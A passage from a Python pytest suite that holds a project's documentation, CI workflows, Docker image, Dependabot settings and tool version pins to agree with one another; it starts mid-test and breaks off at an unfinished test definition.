        assert re.split(r", | or ", named.group(1)) == re.findall(r'"([^"]+)"', listed.group(1))

    def test_the_developer_page_says_what_the_licence_walk_lists_and_refuses(self) -> None:
        """20:M11. The page called the canvas's two packages MIT like every other bundled one,
        where the lock file's production packages are Apache-2.0, ISC, BSD-3-Clause and 0BSD as
        well, and it said nothing of what the walk lists: since 20:I2, every installed production
        package of the lock file, the build refusing one it missed. Held to the script, for what
        the page says it reads and refuses, and to the lock file, for the two licences."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "what it writes": "The build writes the licence of every package the pages bundle "
            "into ``third-party-licenses.txt``, beside them",
            "what it lists": "It lists every production package of ``gui/package-lock.json`` "
            "that is installed",
            "how": "it walks npm's own tree of them, reads each one's directory off the lock "
            "file rather than off a path npm prints",
            "what it refuses": "refuses, naming each, a production package of the lock file the "
            "walk did not list - which would ship without its notice, and past the licence check "
            "- and a package it listed that the lock file does not hold",
            "the canvas": "laid out with ``@dagrejs/dagre``, both MIT.",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"
        assert "like every other bundled package" not in said
        script = (ROOT / "gui" / "scripts" / "licenses.mjs").read_text(encoding="utf-8")
        for read in (
            "npm ls --omit=dev --all --long --json",
            'readFileSync(join(root, "package-lock.json")',
            "const directory = join(root, key);",
            "not listed, a production package of the lock file",
            "not in the lock file",
            "third-party-licenses.txt",
        ):
            assert read in script, f"gui/scripts/licenses.mjs no longer has {read!r}"
        lock = json.loads((ROOT / "gui" / "package-lock.json").read_text(encoding="utf-8"))
        licences = {
            key.rpartition("node_modules/")[2]: entry.get("license")
            for key, entry in lock["packages"].items()
            if key and not entry.get("dev")
        }
        assert licences["@xyflow/react"] == licences["@dagrejs/dagre"] == "MIT"


class TestTheCompileService:
    """The container that compiles what the c backend generates, and the README's account of it.

    ci builds the image and runs one service in it; it does not run *this* one, which
    compiles and links what the generator wrote, so what holds the script and the page
    together is what can be read here: the numbers the README shows under ``== symbols``,
    which went two objects stale when the demo gained its two strings, and the path the
    verification reads, which has to be the file the generation writes.
    """

    def block(self) -> str:
        """The ``== symbols`` transcript of the README, both variants."""
        return README.split("== symbols   [base]", 1)[1].split("```", 1)[0]

    def test_the_readme_counts_the_variables_the_demo_declares(
        self, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """Counted by the script the container runs, over a fresh dump of the shipped demo.

        It is not a ``$ ddd`` command, so the transcript harness never reaches it; the demo
        gained ``SoftwareLabel`` and ``StateName`` with the strings and the block went on
        saying twenty-one.
        """
        assert main(["dump", str(DEMO), "--format", "json"]) == EXIT_OK
        declarations = verify_symbols.defines(json.loads(capsys.readouterr().out))
        declared = {entry["name"] for entry in declarations}
        conditional = {entry["name"] for entry in declarations if entry["condition"]}
        shown = self.block()
        assert f"{len(declared) - len(conditional)} of {len(declared)} declared" in shown, (
            f"the [base] run defines every one of the {len(declared)} variables the demo "
            f"declares but the {len(conditional)} behind a condition"
        )
        assert f"{len(declared)} of {len(declared)} declared" in shown, (
            f"the [defines] run defines all {len(declared)} of them"
        )
        for name in sorted(conditional):
            assert f"conditional, absent : {name}" in shown
            assert f"conditional, present: {name}" in shown

    def test_the_dictionary_verified_is_the_one_the_generation_wrote(self) -> None:
        """One analysis, not two. The second was a ``ddd dump`` that had to be handed the
        severity overrides of the first by hand, and exited 1 on the findings the first had
        been told to tolerate."""
        script = (ROOT / "docker" / "compile.sh").read_text(encoding="utf-8")
        written = re.search(r'--dictionary "([^"]+)"', script)
        read = re.search(r'verify_symbols\.py "([^"]+)"', script)
        assert written is not None, "the generation does not write the dictionary it verifies"
        assert read is not None, "nothing hands the dictionary to the symbol check"
        assert written.group(1) == read.group(1)

    def test_the_image_ships_the_diagram_program_the_docs_build_uses(self) -> None:
        """``docs/conf.py`` names the launcher on the PATH, which is what the image installs.

        It used to say the image ships a jar at ``/plantuml.jar``; it never did, so the
        default path never existed and the fallback was always what ran.
        """
        dockerfile = (ROOT / "docker" / "Dockerfile").read_text(encoding="utf-8")
        assert "plantuml" in dockerfile, "the image no longer installs plantuml at all"
        assert ".jar" not in dockerfile, (
            "the image ships a jar again, and docs/conf.py says the launcher on the PATH is "
            "what the documentation build runs"
        )


class TestTheDevelopmentImage:
    """What the image installs, and what builds it.

    The compose services are the local equivalents of the ci jobs, and the image they share
    was the one thing no job ever built - which is how a ``COPY`` of a directory removed
    three releases earlier went on failing ``docker compose build`` until somebody tried to
    run a service.
    """

    def compose(self) -> str:
        return (ROOT / "docker-compose.yml").read_text(encoding="utf-8")

    def test_the_documentation_service_runs_out_of_the_image(self) -> None:
        """A service installing its own requirements is a second, unpinned build step.

        ``docs`` reinstalled ``.[docs]`` on every run - a network round trip before every
        documentation build, and a set of versions that has nothing to do with the image the
        other five services share.  The image carries them now.
        """
        docs = self.compose().split("docs:", 1)[1]
        assert "pip install" not in docs.split("shell:", 1)[0], (
            "the docs service installs its requirements again on every run"
        )
        dockerfile = (ROOT / "docker" / "Dockerfile").read_text(encoding="utf-8")
        assert re.search(r'pip install[^\n]*"\.\[[^"]*docs[^"]*\]"', dockerfile), (
            "the image does not install the documentation requirements, so the docs service "
            "has nothing to build with"
        )

    def test_a_workflow_builds_it(self) -> None:
        """Otherwise the first person to need the image is the one who finds it broken."""
        built = [
            workflow.name
            for workflow in sorted((ROOT / ".github" / "workflows").glob("*.yml"))
            if "docker compose build" in workflow.read_text(encoding="utf-8")
        ]
        assert built, (
            "no workflow builds docker/Dockerfile, so nothing notices when the image stops "
            "building until somebody runs a service"
        )


def test_the_screenshot_image_is_the_playwright_the_page_pins() -> None:
    """The reference images are only true of one renderer: the Playwright the page pins, in its
    own Linux image. A bump of one without the other photographs with a browser the references
    were not made with, and every story fails at once for no reason of its own."""
    pinned = json.loads((ROOT / "gui" / "package.json").read_text(encoding="utf-8"))[
        "devDependencies"
    ]["@playwright/test"]
    image = f"mcr.microsoft.com/playwright:v{pinned}-noble"
    assert image in (ROOT / "docker-compose.yml").read_text(encoding="utf-8")
    assert image in (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")


def workflow_actions() -> dict[str, set[str]]:
    """Every action the workflows use, to the set of refs they pin it at."""
    used: dict[str, set[str]] = {}
    for workflow in sorted((ROOT / ".github" / "workflows").glob("*.yml")):
        text = workflow.read_text(encoding="utf-8")
        for action, ref in re.findall(r"uses:\s*([\w.-]+/[\w.-]+)@(\S+)", text):
            used.setdefault(action, set()).add(ref)
    return used


def dependabot() -> dict[str, list[str]]:
    """Each ecosystem dependabot watches, to the directories it watches it in.

    Read with a regex rather than a yaml parser, as the pre-commit hook definition is: the
    file is a handful of ``key: value`` lines, and a yaml dependency in the test requirements
    would be a larger commitment than the thing being read.
    """
    text = (ROOT / ".github" / "dependabot.yml").read_text(encoding="utf-8")
    entries = re.findall(
        r"package-ecosystem:\s*\"?([\w-]+)\"?.*?directory:\s*\"?([^\s\"]+)", text, flags=re.S
    )
    assert len(entries) == text.count("package-ecosystem:"), (
        "an entry of dependabot.yml names no directory"
    )
    watched: dict[str, list[str]] = {}
    for ecosystem, directory in entries:
        watched.setdefault(ecosystem, []).append(directory)
    return watched


class TestWhatKeepsTheToolchainMoving:
    """Everything this repository pins, and the one thing that proposes moving it.

    Nothing here moves on its own - the actions are pinned by major tag, the two tools that
    are gates are capped to a minor, the extension's and the browser interface's lock files
    pin exactly - which is what makes a build reproducible and, without something proposing
    the updates, what makes a release the moment somebody discovers the toolchain has moved
    on without them.
    """

    @pytest.mark.parametrize("ecosystem", ["github-actions", "pip", "npm"])
    def test_every_manifest_of_this_repository_is_watched(self, ecosystem: str) -> None:
        watched = dependabot()
        assert ecosystem in watched, (
            f"nothing proposes an update for {ecosystem}, so those pins move only when a "
            f"release is already blocked by one of them"
        )
        for directory in watched[ecosystem]:
            assert (ROOT / directory.lstrip("/")).resolve().is_dir(), (
                f"{ecosystem} is watched in {directory}, which is not a directory"
            )

    def test_the_node_manifests_are_watched_where_they_live(self) -> None:
        """A directory that does not hold the manifest is watched in silence: dependabot
        reports "no dependencies found" on its own page and nothing else."""
        watched = {Path(directory.lstrip("/")) for directory in dependabot()["npm"]}
        assert watched == {Path("editors/vscode"), Path("gui")}
        for directory in watched:
            assert (ROOT / directory / "package.json").is_file()
            assert (ROOT / directory / "package-lock.json").is_file()

    @pytest.mark.parametrize("tool", ["ruff", "mypy"])
    def test_the_two_tools_that_are_gates_are_capped(self, tool: str) -> None:
        """A library's new release breaks a test; these two fail the lint job by design.

        ``ruff format --check`` disagrees with whatever the new release decided to reformat,
        and a ``mypy`` minor adds inferences that strict mode reports - on whatever ran next,
        which on the wrong day is the release. Everything else here is a lower bound.
        """
        requirements = (ROOT / "requirements-dev.txt").read_text(encoding="utf-8")
        line = next(
            line for line in requirements.splitlines() if line.strip().startswith(f"{tool}>")
        )
        assert "<" in line, (
            f"{line.strip()} takes whatever {tool} is released next, which turns the lint job "
            f"red on the day it is released rather than on the day somebody upgrades it"
        )

    def test_the_documentation_is_built_with_one_sphinx(self) -> None:
        """20:M13. The documentation is built with ``-W``, so a sphinx release that warns about
        anything the pages do fails the build, as the two gates above fail the lint job. A lower
        bound took whichever sphinx was newest on the day, and on the wrong day that is a
        release's documentation. Exact, the pin is moved by a pull request dependabot opens,
        which builds the documentation with the new one before it is merged."""
        requirements = (ROOT / "requirements-docs.txt").read_text(encoding="utf-8")
        line = next(
            line.strip()
            for line in requirements.splitlines()
            if re.match(r"sphinx\s*[<>=!~]", line.strip(), re.IGNORECASE)
        )
        assert re.fullmatch(r"sphinx==\d+(?:\.\d+)+", line), (
            f"{line} takes whichever sphinx is newest on the day the documentation is built"
        )
        assert "/" in dependabot()["pip"], "nothing proposes moving the pin"

    def test_publish_installs_the_release_s_tools_at_one_version(self) -> None:
        """20:M13. Publish installed whichever pip, build and twine were newest on the morning of
        a release, after the suite had passed: a build or a twine that changed what it writes or
        accepts changed the release, or failed it. They come from ``requirements-release.txt``,
        every line of which is one version, and which dependabot reads, as it reads every
        requirements file at the root."""
        requirements = (ROOT / "requirements-release.txt").read_text(encoding="utf-8")
        pinned = [
            line.strip()
            for line in requirements.splitlines()
            if line.strip() and not line.lstrip().startswith("#")
        ]
        assert sorted(line.split("==", 1)[0] for line in pinned) == ["build", "twine"]
        assert all(re.fullmatch(r"[\w-]+==\d+(?:\.\d+)+", line) for line in pinned), pinned
        build = uncommented(job(PUBLISH_WORKFLOW, "build"))
        assert "python -m pip install -r requirements-release.txt" in build
        installs = re.findall(r"pip install[^\n]*", build)
        # By the words of each line: an option's dashes are no word, so a pattern looking for
        # --upgrade between word boundaries never finds it.
        loose = [
            found
            for found in installs
            if {"build", "twine", "--upgrade", "-U"} & set(found.split())
        ]
        assert not loose, f"the release installs a tool at whatever version is newest: {loose}"
        assert "/" in dependabot()["pip"], "nothing proposes moving the pins"

    def test_the_build_backend_is_one_version(self) -> None:
        """20:M13. ``pyproject.toml`` required hatchling and hatch-requirements-txt at whatever
        was newest, so a release of the backend changed the wheel every build of the project
        wrote - the release's among them - on the day it came out."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        requires = metadata["build-system"]["requires"]
        assert sorted(line.split("==", 1)[0] for line in requires) == [
            "hatch-requirements-txt",
            "hatchling",
        ]
        assert all(re.fullmatch(r"[\w-]+==\d+(?:\.\d+)+", line) for line in requires), requires

    def test_the_extension_is_packaged_by_one_vsce(self) -> None:
        """20:M13. The extension's scripts ran ``npx --yes @vscode/vsce``, whichever vsce was
        newest: on the day a release of it changed what it packages or refuses, so did the
        ``.vsix`` the release attaches. Every script naming it names one version."""
        manifest = json.loads(
            (ROOT / "editors" / "vscode" / "package.json").read_text(encoding="utf-8")
        )
        named = [
            found
            for command in manifest["scripts"].values()
            for found in re.findall(r"@vscode/vsce(\S*)", command)
        ]
        assert named, "no script of the extension runs vsce"
        assert len(set(named)) == 1, f"the scripts run vsce at {sorted(set(named))}"
        assert re.fullmatch(r"@\d+(?:\.\d+)+", named[0]), f"vsce is run as @vscode/vsce{named[0]}"

    def test_the_page_says_the_documentation_s_sphinx_is_one_release(self) -> None:
        """Where the maintainer reads what is pinned, and what a pin is held to."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "the pin": "``sphinx`` is pinned to one release in ``requirements-docs.txt``",
            "why": "the documentation is built with ``-W``, so a sphinx that warns about "
            "anything new fails the documentation's build",
            "what holds it": "both caps to being caps, and sphinx",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"

    def test_the_page_says_where_the_release_s_tools_are_pinned(self) -> None:
        """Each pin's home, and the two dependabot may not move."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "build and twine": "``build`` and ``twine`` in ``requirements-release.txt``, which "
            "``publish.yml`` installs them from",
            "the backend": "``hatchling`` and ``hatch-requirements-txt`` in the "
            "``[build-system]`` table of ``pyproject.toml``",
            "vsce": "``@vscode/vsce`` in the scripts of ``editors/vscode/package.json``",
            "what dependabot may not reach": "Dependabot may not reach the backend, since its "
            "documentation says nothing of ``[build-system]``",
            "what holds them": "the release's tools each to one version",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"

    def test_the_three_say_alike_what_dependabot_may_not_reach(self) -> None:
        """``dependabot.yml`` said its pip entry does not reach the backend ``pyproject.toml``
        pins in ``[build-system]``, where the page and ``pyproject.toml`` said it may not.
        Dependabot's documentation says nothing of that table, so the three now say what holds:
        perhaps, which its first weekly run shows; and of vsce, inside an ``npx`` command, that
        no entry reaches it."""
        config = comments_of((ROOT / ".github" / "dependabot.yml").read_text(encoding="utf-8"))
        manifest = comments_of((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        page = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "dependabot.yml, the backend": (
                config,
                "Perhaps the backend that pyproject.toml pins in [build-system] as well: "
                "Dependabot's documentation says nothing of that table, so its first weekly run "
                "shows whether it proposes a move there.",
            ),
            "dependabot.yml, vsce": (
                config,
                "Not the vsce the extension's scripts name: a version inside an npx command is no "
                "dependency.",
            ),
            "pyproject.toml": (
                manifest,
                "Dependabot's documentation says nothing of this table, so a move here may have "
                "to be made by hand.",
            ),
            "the page, the backend": (
                page,
                "Dependabot may not reach the backend, since its documentation says nothing of "
                "``[build-system]`` - its first weekly run shows whether it does -",
            ),
            "the page, vsce": (
                page,
                "and cannot reach vsce, since a version written into an ``npx`` command is no "
                "dependency it reads: vsce is moved by hand, and the backend may have to be.",
            ),
        }
        missing = [what for what, (text, claim) in claims.items() if claim not in text]
        assert not missing, f"no longer said: {missing}"
        assert "Not the backend" not in config

    def test_an_action_is_pinned_at_one_version_across_the_workflows(self) -> None:
        """Three workflows, one toolchain: a version bumped in two of them and not the third
        is how ci ran an upload two majors behind the one the release used."""
        disagreeing = {
            action: sorted(refs) for action, refs in workflow_actions().items() if len(refs) > 1
        }
        assert not disagreeing, (
            f"the workflows pin the same action at different versions: {disagreeing}"
        )


class TestContinuousIntegration:
    """The classifiers are a public claim about what this package runs on."""

    def test_every_advertised_python_version_is_tested(self) -> None:
        """A version advertised on the index but absent from the matrix is untested support.

        Adding a classifier costs one line and nothing checks it, so the claim and the
        evidence drift apart silently - in the direction of claiming more.
        """
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        advertised = {
            classifier.rsplit("::", 1)[1].strip()
            for classifier in metadata["project"]["classifiers"]
            if classifier.startswith("Programming Language :: Python ::")
        }
        workflow = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
        listed = re.search(r"python-version: \[([^]]*)\]", workflow)
        assert listed is not None, "the ci matrix no longer lists the python versions"
        tested = set(re.findall(r"\d+\.\d+", listed.group(1)))
        assert tested == advertised, (
            f"ci tests python {sorted(tested)} but the package advertises {sorted(advertised)}"
        )

    def test_every_advertised_system_is_tested(self) -> None:
        """20:M12, decision 20.6. The package claimed to run on any system, and ci runs ubuntu
        and windows alone: no cell runs macOS. Its classifiers name the two systems the matrix
        runs, and a system added to either without the other fails here."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        advertised = {
            classifier
            for classifier in metadata["project"]["classifiers"]
            if classifier.startswith("Operating System ::")
        }
        listed = re.search(r"^        os: \[([^]]*)\]$", CI_WORKFLOW, re.M)
        assert listed is not None, "the ci matrix no longer lists the systems"
        systems = {
            "ubuntu-latest": "Operating System :: POSIX :: Linux",
            "windows-latest": "Operating System :: Microsoft :: Windows",
        }
        tested = {
            systems.get(runner, f"a system for {runner}")
            for runner in re.findall(r"[\w.-]+", listed.group(1))
        }
        assert tested == advertised, (
            f"ci tests {sorted(tested)} but the package advertises {sorted(advertised)}"
        )

    def test_the_workflow_and_the_page_say_which_systems_are_claimed(self) -> None:
        said = comments_of(CI_WORKFLOW)
        page = flattened(PAGES["docs/developer_documentation.rst"])
        claims = {
            "the workflow": "The package claims python 3.12, 3.13 and 3.14, on Windows and "
            "Linux, which its classifiers list.",
            "the workflow, macOS": "No cell runs macOS, and the package does not claim it.",
            "the page": "the six combinations the classifiers in ``pyproject.toml`` advertise: "
            "Windows and Linux, and not macOS, which no cell runs",
            "the page, the test": "so advertising a new interpreter or a new system without "
            "testing it fails",
        }
        missing = [
            what
            for what, claim in claims.items()
            if claim not in (said if what.startswith("the workflow") else page)
        ]
        assert not missing, f"no longer said: {missing}"
        assert "os independent" not in said


class TestWhatThePageSaysOfCi:
    """20:M11. The developer page's account of ``ci.yml`` counted two jobs and five more where
    the workflow has eight, never described ``gui-screenshots``, and left it out of the jobs
    ``dev-build`` waits for; and it gave the suite a couple of minutes where it takes about
    seven. Each count and list is held here to the workflow it describes."""

    @staticmethod
    def section() -> str:
        """The page's section on continuous integration, its line breaks flattened."""
        page = PAGES["docs/developer_documentation.rst"]
        section = page.split("\nContinuous integration\n", 1)[1]
        return flattened(section.split("\n.. _development-builds:", 1)[0])

    def test_it_counts_every_job_of_ci_and_names_each(self) -> None:
        said = self.section()
        counted = re.search(r"in (\w+) jobs, ``test`` and ``lint``, and (\w+) more", said)
        assert counted is not None, "the page no longer counts the jobs of ci.yml"
        names = job_names(CI_WORKFLOW)
        total = NUMBER_WORDS[counted.group(1)] + NUMBER_WORDS[counted.group(2)]
        assert total == len(names), f"the page counts {total} jobs, and ci.yml has {names}"
        unnamed = [name for name in names if f"``{name}``" not in said]
        assert not unnamed, f"the page's section on ci never names {unnamed}"

    def test_it_says_what_gui_screenshots_does(self) -> None:
        said = self.section()
        claims = {
            "what it does": "``gui-screenshots`` photographs every story of ``gui/`` and "
            "compares each with the reference image committed beside the stories",
            "where": "in Playwright's own Linux image, of the version ``gui/package.json`` pins, "
            "which is the one place those images are made",
            "what it catches": "a look that changes by accident fails here, and one changed on "
            "purpose arrives with its new references in the same pull request",
            "what a failure leaves": "A run of it that fails uploads the differences as "
            "``screenshots-diff``.",
        }
        missing = [what for what, claim in claims.items() if claim not in said]
        assert not missing, f"the developer page no longer says {missing}"
        assert "name: screenshots-diff" in job(CI_WORKFLOW, "gui-screenshots")

    def test_it_lists_every_job_dev_build_waits_for(self) -> None:
        """The development builds' section names what ``dev-build`` waits for, which its
        ``needs`` states: a job added to ``ci.yml`` joins both, or this fails."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        listed = re.search(r"``dev-build`` waits for every other job of the run - (.+?) - so", said)
        assert listed is not None, "the page no longer lists what dev-build waits for"
        named = re.findall(r"``([\w-]+)``", listed.group(1))
        waited = re.search(r"^    needs: \[([^]\n]*)\]$", job(CI_WORKFLOW, "dev-build"), re.M)
        assert waited is not None, "dev-build no longer lists the jobs it waits for"
        assert named == waited.group(1).split(", ")
        assert (
            "a test holds a job added to ``ci.yml`` to joining the list, and another holds this "
            "one to it"
        ) in said

    def test_it_gives_the_suite_the_minutes_it_was_timed_at(self) -> None:
        """Timed on a fresh checkout of the branch that wrote it, at c5adc2e0: 9670 tests in
        6 m 55 s, and 6 m 35 s for the gates of the two commits after it, in the warm checkout. A
        couple of minutes was neither."""
        said = flattened(PAGES["docs/developer_documentation.rst"])
        assert (
            "The whole suite takes minutes rather than seconds, how many varying with the "
            "machine - about seven, in a fresh checkout, on the Linux machine it was last timed "
            "on -"
        ) in said
        assert "a couple of minutes" not in said


SKIPPING = {"skip", "skipif", "importorskip", "xfail"}
"""The four ways pytest is asked to report a test as something other than run or failed."""


def pytest_attributes(source: str) -> set[str]:
    """Every ``pytest.…`` name an expression in the module reaches for.

    Read as syntax rather than as text, so that a test *about* skipping - this one - can name
    the calls it forbids without matching itself.
    """
    found = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Attribute):
            parts = []
            root: ast.expr = node
            while isinstance(root, ast.Attribute):
                parts.append(root.attr)
                root = root.value
            if isinstance(root, ast.Name) and root.id == "pytest":
                found.add(".".join(["pytest", *reversed(parts)]))
    return found


class TestTheSuiteRunsEverythingEverywhere:
    """The convention the developer page states, and the controls under the guards.

    Two failure modes that both look like a green run. A test that skips reports success
    without having run, so the behaviour it covers is covered on somebody's machine and
    nowhere else; and a guard whose regex or walker finds nothing passes over an empty list,
    which is how the count of the checks with a fixed severity went stale - the sentence it
    counts was reworded, the guard stopped recognising it, and nothing was red.
    """

    @pytest.mark.parametrize("module", sorted(path.name for path in (ROOT / "tests").glob("*.py")))
    def test_nothing_in_the_suite_skips(self, module: str) -> None:
        """``docs/developer_documentation.rst`` states this as a rule; here it is enforced.

        The one that got past it was a directory junction, a windows feature, so the case was
        exercised on the windows cells of the matrix and reported skipped on the ubuntu ones -
        while the page told a reader that every cell runs everything. A platform makes the
        *spelling* of a second path to a directory differ, not the behaviour under test, so
        the way out is a helper that makes one either way rather than a skip.
        """
        source = (ROOT / "tests" / module).read_text(encoding="utf-8")
        skipping = sorted(
            name for name in pytest_attributes(source) if name.rsplit(".", 1)[1] in SKIPPING
        )
        assert not skipping, (
            f"tests/{module} reaches for {skipping}. A test that does not run reports success: "
            f"make the case run on every platform - tests/conftest.py's directory_link is how "
            f"the last one was - or, if it truly cannot, amend the convention on the developer "
            f"page first"
        )

    def test_no_line_is_exempted_from_the_coverage_gate(self) -> None:
        """The gate is 100 % of lines and branches, and an exemption is how that stops meaning
        anything - one comment at a time, each of them reasonable on its own.

        The one there was sat on ``if TYPE_CHECKING:``, which ``pyproject.toml`` already
        excludes for the whole project, so it exempted nothing and read as though a rule
        needed an escape hatch. The other was ``no branch`` over an arm the suite does
        execute - a stream the language server tests replace - so both spellings are
        weighed here: half the gate is branches, and the comment that excuses one of them
        is the same comment.
        """
        exempted = [
            f"{path.relative_to(ROOT).as_posix()}:{number}"
            for directory in ("src", "tests", "tools", "docker")
            for path in sorted((ROOT / directory).rglob("*.py"))
            for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1)
            if re.search(r"pragma:\s*no\s+(cover|branch)", line)
        ]
        assert not exempted, (
            f"these lines are excused from the coverage gate one by one: {exempted}. A branch "
            f"nothing reaches is a branch to delete; one that is reached needs the test that "
            f"reaches it. The project-wide exclusions live in pyproject.toml"
        )

    def test_no_page_recommends_running_the_suite_without_its_summary(self) -> None:
        """``addopts`` carries ``-q`` already, and a second one silences the count.

        A run that passes both prints the dots, the failures and nothing else: no "N passed",
        no coverage total, no statement of whether the gate was met. A page recommending that
        spelling hands a reader a run whose result they have to infer from the exit code.
        """
        shown = [
            (document, line.strip().removeprefix("$ ").strip())
            for document, text in PAGES.items()
            for line in text.splitlines()
            if re.match(r"^\s*(?:\$ )?(?:python -m )?pytest\b", line)
        ]
        assert shown, "no page is recognised as showing a pytest command, so this weighs nothing"
        for document, command in shown:
            assert not re.search(r"(?<!-)-q\b|--quiet\b", command), (
                f"{document} shows `{command}`, which silences the summary: the quiet flag is "
                f"already in the addopts of pyproject.toml"
            )

    def test_the_pages_that_count_the_fixed_checks_are_recognised(self) -> None:
        """Positive control: several pages count them, and the guard has to find them."""
        counting = {page for page in PAGES if fixed_severity_counts(PAGES[page])}
        assert counting, (
            "no page is recognised as counting the checks whose severity is fixed, so the "
            "guard over that count passes on every page without weighing anything"
        )

    def test_the_page_that_counts_the_description_kinds_is_recognised(self) -> None:
        counting = {page for page in PAGES if description_kind_counts(PAGES[page])}
        assert counting, (
            "no page is recognised as counting the description kinds, so the guard over that "
            "count passes on every page without weighing anything"
        )

    @pytest.mark.parametrize("document", ["README.md", "docs/developer_documentation.rst"])
    def test_the_guard_suites_are_counted_as_they_are_listed(self, document: str) -> None:
        """Both documents introduce the same list with a number, and both had to be edited
        when a fifth suite joined it. One of them was; the README went on saying four."""
        paragraph = next(
            block
            for block in PAGES[document].split("\n\n")
            if re.search(r"\w+ (?:more )?suites guard", block)
        )
        counted = re.search(r"(\w+) (?:more )?suites guard", paragraph)
        assert counted is not None
        named = set(re.findall(r"tests/test_\w+\.py", paragraph))
        assert NUMBER_WORDS[counted.group(1).lower()] == len(named), (
            f"{document} says {counted.group(1)} suites and names {sorted(named)}"
        )

    def test_the_spec_links_to_its_own_sections(self) -> None:
        """Positive control under the two guards that walk the SPEC's internal links."""
        assert spec_links(), (
            "no internal link is found in the SPEC, so the dangling-anchor guard and the "
            "numbered-link guard both pass over an empty list"
        )

    def test_the_published_schemas_carry_closed_sets(self) -> None:
        """Positive control under the guard that every enumerated value says what it means."""
        found = {kind: len(enumerations_in(published(kind))) for kind in published_kinds()}
        assert any(found.values()), (
            f"no enumeration is found in any published schema, so the per-value documentation "
            f"guard passes over an empty list for every kind: {found}"
        )


MASTER_HEAD = "1" * 40
"""master's newest commit, which a run Publish's completion starts is given as its own."""

TAGGED = "2" * 40
"""The commit a release's tag names, which Publish's run for that release ran on."""


def started_by(event_name: str, ref: str, tag: str = "", run_id: str = "41") -> dict[str, Any]:
    """The context a run of the documentation workflow is given by an event of its own: that
    event's ref, and the newest commit on it. A dispatch has its inputs, the tag it names an
    empty string when it names none, as an input's empty default is; no other event has any."""
    context: dict[str, Any] = {
        "github": {
            "event_name": event_name,
            "ref": ref,
            "ref_name": ref.split("/", 2)[2],
            "sha": MASTER_HEAD,
            "run_id": run_id,
            "event": {},
        }
    }
    if event_name == "workflow_dispatch":
        context["inputs"] = {"tag": tag}
    return context


def completed(
    event: str = "release",
    conclusion: str = "success",
    head_branch: str = "v0.12.0",
    run_id: str = "42",
) -> dict[str, Any]:
    """The context a run Publish's completion starts is given, as GitHub documents
    ``workflow_run``: its own ref and commit are the default branch's - master's newest commit,
    whatever Publish ran on - and Publish's run is in the payload, with the event that started
    it, its conclusion, the commit it ran on and, as ``head_branch``, a release's tag. Publish's
    run for v0.11.0, 35957643647, reads ``"event": "release", "head_branch": "v0.11.0"`` and the
    commit ``v0.11.0`` names as ``head_sha``."""
    return {
        "github": {
            "event_name": "workflow_run",
            "ref": "refs/heads/master",
            "ref_name": "master",
            "sha": MASTER_HEAD,
            "run_id": run_id,
            "event": {
                "workflow_run": {
                    "name": "Publish",
                    "event": event,
                    "conclusion": conclusion,
                    "head_branch": head_branch,
                    "head_sha": TAGGED,
                }
            },
        }
    }


class TestPublishedDocumentation:
    """The documentation is a deliverable with an address, published by ci.

    The two properties pinned here are the ones that fail silently. Everything else about
    ``docs.yml`` announces itself: a build that cannot find its input, or an upload of a
    directory that was never written, is a red run.
    """

    def test_the_published_address_is_the_same_everywhere(self) -> None:
        """A customer reaches the documentation through the package metadata on the index.

        Nothing resolves that url at build time, so a wrong one is a 404 with the product's
        name on it, found by whoever was trying to read the manual. The repository names the
        site's root; a release's sdist carries the ``pyproject.toml`` Publish's build pointed at
        the release's own directory (20:M7), which the suite runs from as well.
        """
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        developer_documentation = (ROOT / "docs" / "developer_documentation.rst").read_text(
            encoding="utf-8"
        )
        stated = metadata["project"]["urls"]["Documentation"]
        assert stated in (DOCS_URL, f"{DOCS_URL}v{__version__}/"), stated
        assert DOCS_URL in README
        assert DOCS_URL in developer_documentation

    def test_the_published_build_treats_warnings_as_errors(self) -> None:
        """Dropping ``-W`` costs nothing visible and quietly ends the guarantee.

        The reference pages are generated from the sources, so a renamed option or a removed
        field turns into a warning about a reference that no longer resolves. With warnings as
        errors that is a failed run; without it the page is published with the section simply
        missing, which nobody notices, because the documentation still builds.
        """
        command = next(line for line in DOCS_WORKFLOW.splitlines() if "sphinx-build" in line)
        assert "-W" in command.split(), (
            f"the published documentation is built without -W: {command.strip()}"
        )

    @pytest.mark.parametrize(
        ("context", "built", "deployed"),
        [
            (started_by("push", "refs/heads/master"), True, True),
            (started_by("pull_request", "refs/pull/5/merge"), True, False),
            (started_by("workflow_dispatch", "refs/heads/master"), True, True),
            (started_by("workflow_dispatch", "refs/heads/feature"), True, False),
            (started_by("workflow_dispatch", "refs/heads/master", tag="v0.12.0"), True, True),
            (started_by("workflow_dispatch", "refs/heads/feature", tag="v0.12.0"), True, False),
            (completed(), True, True),
            (completed(conclusion="failure"), False, False),
            (completed(conclusion="cancelled"), False, False),
            (completed(event="workflow_dispatch", head_branch="master"), False, False),
            (completed(event="workflow_dispatch"), False, False),
            (completed(event="pull_request"), False, False),
        ],
        ids=[
            "a push to master",
            "a pull request",
            "a dispatch on master",
            "a dispatch on a branch",
            "a dispatch from master naming a release",
            "a dispatch from a branch naming a release",
            "a release Publish published",
            "a release Publish failed or refused",
            "a release whose Publish was cancelled",
            "Publish's dry run",
            "Publish dispatched from a tag",
            "a pull request's own workflow called Publish",
        ],
    )
    def test_only_master_and_a_release_publish_published_are_ever_deployed(
        self, context: dict[str, Any], built: bool, deployed: bool
    ) -> None:
